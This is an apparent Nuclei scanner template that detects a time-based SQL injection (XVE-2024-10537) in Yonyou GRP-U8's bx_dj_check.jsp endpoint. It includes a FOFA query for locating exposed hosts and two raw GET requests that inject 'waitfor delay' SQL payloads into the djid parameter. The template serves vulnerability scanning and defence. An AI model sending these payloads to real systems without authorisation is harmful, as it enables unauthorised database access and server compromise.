id: yongyouGRP-U8-bx_dj_check_jsp-sql-XVE-2024-10537

info:
  name: 用友GRP-U8 bx_dj_check.jsp SQL延时注入漏洞 (XVE-2024-10537)
  author: Superhero
  severity: high
  description: |-
    fofa: app="用友-GRP-U8"
    用友GRP-U8R10行政事业内控管理软件 bx_dj_check.jsp 接口处存在SQL注入漏洞，未授权的攻击者可利用此漏洞获取数据库权限，深入利用可获取服务器权限。
  reference:
    - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247488103&idx=1&sn=15f216fcd20addb9ef1f82bbcb50beb4&chksm=c267a754f5102e42b49fcab1ba9adb24013501f15c8b9f6c9aff9ae5b51fef262259454368a3&token=1431500657&lang=zh_CN#rd
  tags: sql injection


http:
  - raw:
      - |
        GET /u8qx/bx_dj_check.jsp?djlxdm=OER&djid=1';waitfor+delay+'0:0:4'-- HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36

      - |
        GET /u8qx/bx_dj_check.jsp?djlxdm=OER&djid=1';waitfor+delay+'0:0:8'-- HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36

    matchers:
      - type: dsl
        dsl:
          - 'duration_1>=4 && duration_1<=5'  
          - 'duration_2>=8 && duration_2<=9'
        condition: and



